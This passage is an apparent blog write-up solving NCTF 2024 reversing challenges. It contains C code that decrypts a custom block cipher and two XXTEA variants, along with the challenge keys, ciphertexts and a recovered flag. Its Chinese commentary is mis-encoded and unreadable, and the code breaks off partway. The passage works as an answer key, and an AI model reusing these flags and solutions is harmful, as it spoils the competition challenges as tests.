class="number">0x4E</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dword_7FF699A4A040[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x00070E15</span>, <span class="number">0x1C232A31</span>, <span class="number">0x383F464D</span>, <span class="number">0x545B6269</span>, <span class="number">0x70777E85</span>, <span class="number">0x8C939AA1</span>, <span class="number">0xA8AFB6BD</span>, <span class="number">0xC4CBD2D9</span>,</span><br><span class="line">    <span class="number">0xE0E7EEF5</span>, <span class="number">0xFC030A11</span>, <span class="number">0x181F262D</span>, <span class="number">0x343B4249</span>, <span class="number">0x50575E65</span>, <span class="number">0x6C737A81</span>, <span class="number">0x888F969D</span>, <span class="number">0xA4ABB2B9</span>,</span><br><span class="line">    <span class="number">0xC0C7CED5</span>, <span class="number">0xDCE3EAF1</span>, <span class="number">0xF8FF060D</span>, <span class="number">0x141B2229</span>, <span class="number">0x30373E45</span>, <span class="number">0x4C535A61</span>, <span class="number">0x686F767D</span>, <span class="number">0x848B9299</span>,</span><br><span class="line">    <span class="number">0xA0A7AEB5</span>, <span class="number">0xBCC3CAD1</span>, <span class="number">0xD8DFE6ED</span>, <span class="number">0xF4FB0209</span>, <span class="number">0x10171E25</span>, <span class="number">0x2C333A41</span>, <span class="number">0x484F565D</span>, <span class="number">0x646B7279</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dword_7FF699A4A028[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0xA3B1BAC6</span>, <span class="number">0x56AA3350</span>, <span class="number">0x677D9197</span>, <span class="number">0xB27022DC</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">rotate_left</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">int</span> n)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">generate_buf</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* key, <span class="type">uint32_t</span>* buf)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint32_t</span> key_dword;</span><br><span class="line">            <span class="built_in">memcpy</span>(&amp;key_dword, key + <span class="number">4</span> * i, <span class="number">4</span>);</span><br><span class="line">            <span class="type">uint32_t</span> converted_key = ((key_dword &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">            ((key_dword &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">            ((key_dword &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>) |</span><br><span class="line">            ((key_dword &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">            buf[i] = dword_7FF699A4A028[i] ^ converted_key;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint32_t</span> v12 = dword_7FF699A4A040[j] ^ buf[j + <span class="number">3</span>] ^ buf[j + <span class="number">2</span>] ^ buf[j + <span class="number">1</span>];</span><br><span class="line">            <span class="type">uint8_t</span>* v12_bytes = (<span class="type">uint8_t</span>*)&amp;v12;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">                &#123;</span><br><span class="line">                    v12_bytes[k] = byte_7FF699A4A0D0[v12_bytes[k]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint32_t</span> rot1 = <span class="built_in">rotate_left</span>(v12, <span class="number">23</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot2 = <span class="built_in">rotate_left</span>(v12, <span class="number">13</span>);</span><br><span class="line">        buf[j + <span class="number">4</span>] = (rot1 ^ rot2 ^ v12) ^ buf[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* ciphertext, <span class="type">const</span> <span class="type">uint8_t</span>* key, <span class="type">uint8_t</span>* plaintext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> buf[<span class="number">36</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> buf_1[<span class="number">36</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">generate_buf</span>(key, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> ii = <span class="number">0</span>; ii &lt; <span class="number">4</span>; ii++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> cipher_dword;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;cipher_dword, ciphertext + <span class="number">4</span> * ii, <span class="number">4</span>);</span><br><span class="line">        buf_1[<span class="number">35</span> - ii] = ((cipher_dword &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>) |</span><br><span class="line">            ((cipher_dword &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>) |</span><br><span class="line">            ((cipher_dword &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFF0000</span>) |</span><br><span class="line">            ((cipher_dword &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0xFF000000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">31</span>; m &gt;= <span class="number">0</span>; m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v12_0 = buf[m + <span class="number">4</span>] ^ buf_1[m + <span class="number">3</span>] ^ buf_1[m + <span class="number">2</span>] ^ buf_1[m + <span class="number">1</span>];</span><br><span class="line">        <span class="type">uint8_t</span>* v12_bytes = (<span class="type">uint8_t</span>*)&amp;v12_0;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; <span class="number">4</span>; n++) </span><br><span class="line">        &#123;</span><br><span class="line">            v12_bytes[n] = byte_7FF699A4A0D0[v12_bytes[n]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint32_t</span> rot1 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">24</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot2 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">18</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot3 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">10</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot4 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">2</span>);</span><br><span class="line">        <span class="type">uint32_t</span> L_result = rot1 ^ rot2 ^ rot3 ^ rot4 ^ v12_0;</span><br><span class="line">        buf_1[m] = buf_1[m + <span class="number">4</span>] ^ L_result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v11 = buf_1[i];</span><br><span class="line">        <span class="type">uint8_t</span> b0 = (v11 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint8_t</span> b1 = (v11 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint8_t</span> b2 = (v11 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint8_t</span> b3 = v11 &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint32_t</span> le = (b3 &lt;&lt; <span class="number">24</span>) | (b2 &lt;&lt; <span class="number">16</span>) | (b1 &lt;&lt; <span class="number">8</span>) | b0;</span><br><span class="line">        <span class="built_in">memcpy</span>(plaintext + <span class="number">4</span> * i, &amp;le, <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main_safe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> key[] = <span class="string">&quot;NCTF24nctfNCTF24&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0xFB</span>, <span class="number">0x97</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0xF1</span>, <span class="number">0x99</span>, <span class="number">0x12</span>, <span class="number">0xDF</span>, <span class="number">0x13</span>, <span class="number">0x30</span>, <span class="number">0xF7</span>, <span class="number">0xD8</span>, <span class="number">0x7F</span>, <span class="number">0xEB</span>, <span class="number">0xA0</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x5B</span>, <span class="number">0xA6</span>, <span class="number">0x2A</span>, <span class="number">0xA8</span>, <span class="number">0x05</span>, <span class="number">0xA5</span>, <span class="number">0xF3</span>, <span class="number">0x76</span>, <span class="number">0xBE</span>, <span class="number">0xC9</span>, <span class="number">0x01</span>, <span class="number">0xF9</span>, <span class="number">0x36</span>, <span class="number">0x7B</span>, <span class="number">0x46</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">32</span>]&#123;&#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(enc, key, flag);</span><br><span class="line">    <span class="built_in">decrypt</span>(enc<span class="number">+16</span>, key, flag<span class="number">+16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NCTF&#123;%.32s&#125;\n&quot;</span>, flag);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;58cb925e0cd823c0d0b54fd06b820b7e&#125;</code></p><h2 id="gogo"><a href="#gogo" class="headerlink" title="gogo"></a>gogo</h2><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>main_mainå‡½æ•°å¯ä»¥çœ‹åˆ°æ˜¯å°†è¾“å…¥åˆ†å—é€šè¿‡channelè¿›è¡Œåç¨‹é€šä¿¡ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-15.png" alt="alt text"></p><p>åœ¨main_mainå‡½æ•°é™„è¿‘æœ‰ä¸€ä¸ªå¸¦VMåå­—çš„å‡½æ•°ï¼Œé‡Œé¢å°±æ˜¯æ¥æ”¶mainé‚£è¾¹å‘é€çš„æ•°æ®ï¼Œç„¶ååº•ä¸‹æœ‰ä¸ªå‡½æ•°æ‰§è¡Œï¼Œæ˜¯é€šè¿‡æ“ä½œæ•°è¿›è¡Œè°ƒç”¨VMå‡½æ•°è®¡ç®—ã€‚è¿™è¾¹ä¸€ç³»åˆ—è®¡ç®—å‡½æ•°ä¹Ÿå°è¯æƒ³æ³•ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-16.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-17.png" alt="alt text"></p><p>å¯¹æ¯ä¸ªvmçš„å‡½æ•°éƒ½ä¸‹æ–­ç‚¹è¾“å‡ºæ‰§è¡Œçš„æŒ‡ä»¤ä»¥åŠæ“ä½œæ•°ï¼Œæ–¹ä¾¿åˆ†ææ•´ä¸ªåŠ å¯†æµç¨‹ï¼Œå¦‚main_XORå‡½æ•°æ–­ç‚¹ï¼š</p><p><img src="/2025/03/24/NCTF2024/image-18.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-19.png" alt="alt text"></p><p>è¿è¡Œè¾“å…¥38ä¸ªâ€™1â€™ï¼ˆæ•°æ®ç®€å•æ–¹ä¾¿åˆ†æç®—æ³•ï¼‰ï¼Œå¯ä»¥å¾—åˆ°ä¸€å †æˆ‘ä»¬è¾“å‡ºçš„ä¼ªä»£ç è®¡ç®—è¿‡ç¨‹ï¼Œé€šè¿‡çœ‹åˆ°9e3779b9ä»¥åŠè®¡ç®—çš„ç‰¹å¾ï¼Œå¯ä»¥å‘ç°æ˜¯XXTEAå˜ç§ã€‚</p><p>31313131å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²çš„å­—èŠ‚ï¼Œä¸è¿‡æ˜¯ä»¥4å­—èŠ‚ä¸ºå•ä½è¿›è¡Œè¿ç®—ã€‚</p><p>é€šè¿‡åˆ†æå¯å¾—çŸ¥æ˜¯å°†è¾“å…¥çš„flagåˆ†æˆä¸¤ä»½ï¼Œ20å­—èŠ‚ä¸ºä¸€ç»„ï¼Œåˆ†åˆ«è¿›è¡Œä¸¤ç§å˜ç§XXTEAè®¡ç®—ï¼ŒKeyä¹Ÿä¸ä¸€æ ·ï¼Œä¸è¿‡éƒ½åœ¨è¿™é‡Œé¢å¯ä»¥æ‰¾åˆ°Keyã€‚</p><p><img src="/2025/03/24/NCTF2024/image-20.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-21.png" alt="alt text"></p><p>å¯ä»¥æ ¹æ®ä¼ªä»£ç è®¡ç®—æµç¨‹è¿›è¡Œè¿˜åŸæˆä»£ç ï¼ŒåŸºäºæ ‡å‡†XXTEAè¿›è¡Œç¼–å†™ï¼Œä¸­é—´å¯ä»¥å¯¹æ¯”æ ‡å‡†ç®—æ³•å‘ç°å¼‚æˆ–Keyçš„å€¼åœ¨å“ªï¼Œä»¥åŠæ ¹æ®åŠ å¯†è®¡ç®—çš„ä¸€äº›ä¸­é—´å€¼æ¥éªŒè¯åŠ å¯†ä»£ç ï¼Œæœ€ç»ˆåŠ å¯†å€¼å°±å¯ä»¥æ ¹æ®ä¼ªä»£ç å°¾éƒ¨æœ€ç»ˆå€¼æ¥éªŒè¯ã€‚ï¼ˆè¿™è¾¹ä¸å…·ä½“èµ˜è¿°ï¼‰</p><p><img src="/2025/03/24/NCTF2024/image-23.png" alt="alt text"></p><p>è¿˜åŸåŠ å¯†ä»£ç å¦‚ä¸‹ï¼ŒåŸºäºæ ‡å‡†XXTEAè¿›è¡Œä¿®æ”¹çš„ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX2 (((z <span class="string">&lt;&lt; 5 ^ y &gt;</span>&gt; 2) + (y <span class="string">&lt;&lt; 3 ^ z &gt;</span>&gt; 4)) ^ ((sum ^ y) + (key2[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x6e637466</span>, <span class="number">0x62ef0ed</span> ,<span class="number">0xa78c0b4f</span>, <span class="number">0x32303234</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key2[]&#123; <span class="number">0x32303234</span>, <span class="number">0xd6eb12c3</span>, <span class="number">0x9f1cf72e</span>, <span class="number">0x4e435446</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_1</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    z = v[n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line">        &#123;</span><br><span class="line">            y = v[(p + <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line">            z = v[p] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_2</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    z = v[n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line">        &#123;</span><br><span class="line">            y = v[(p + <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line">            z = v[p] += MX2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨main_RETå‡½æ•°å¯ä»¥çœ‹åˆ°ä¸¤ç»„å­—ç¬¦ä¸²çš„æ¯”å¯¹ï¼Œéƒ½æ˜¯20é•¿åº¦çš„æ¯”å¯¹ï¼Œè¿™ä¸¤ä¸ªæ•°æ®å°±æ˜¯åŠ å¯†åçš„flagäº†ï¼Œæå–å‡ºæ¥åˆ†åˆ«è¿›è¡Œè§£å¯†å³å¯ã€‚</p><p><img src="/2025/03/24/NCTF2024/image-22.png" alt="alt text"></p><h3 id="è§£å¯†-2"><a href="#è§£å¯†-2" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX2 (((z <span class="string">&lt;&lt; 5 ^ y &gt;</span>&gt; 2) + (y <span class="string">&lt;&lt; 3 ^ z &gt;</span>&gt; 4)) ^ ((sum ^ y) + (key2[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x6e637466</span>, <span class="number">0x62ef0ed</span> ,<span class="number">0xa78c0b4f</span>, <span class="number">0x32303234</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key2[]&#123; <span class="number">0x32303234</span>, <span class="number">0xd6eb12c3</span>, <span class="number">0x9f1cf72e</span>, <span class="number">0x4e435446</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_decrypt1</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = DELTA * rounds;</span><br><span class="line">    y = v[<span class="number">0</span>]; </span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> p = <span class="number">5</span> - <span class="number">1</span>; p &gt;= <span class="number">0</span>; p--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">0</span>)</span><br><span class="line">                z = v[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                z = v[(p<span class="number">-1</span>)%<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">4</span>)</span><br><span class="line">                y = v[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            v[p] -= MX;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_decrypt2</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = DELTA * rounds;</span><br><span class="line">    y = v[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> p = <span class="number">5</span> - <span class="number">1</span>; p &gt;= <span class="number">0</span>; p--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">0</span>)</span><br><span class="line">                z = v[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                z = v[(p - <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">4</span>)</span><br><span class="line">                y = v[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            v[p] -= MX2;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc1[] =</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="number">0x5D</span>, <span class="number">0x45</span>, <span class="number">0xD5</span>, <span class="number">0xB9</span>, <span class="number">0x8C</span>, <span class="number">0x95</span>, <span class="number">0x9C</span>, <span class="number">0x38</span>, <span class="number">0x3B</span>, <span class="number">0xB1</span>,</span><br><span class="line">      <span class="number">0x3E</span>, <span class="number">0x1E</span>, <span class="number">0x5F</span>, <span class="number">0xC8</span>, <span 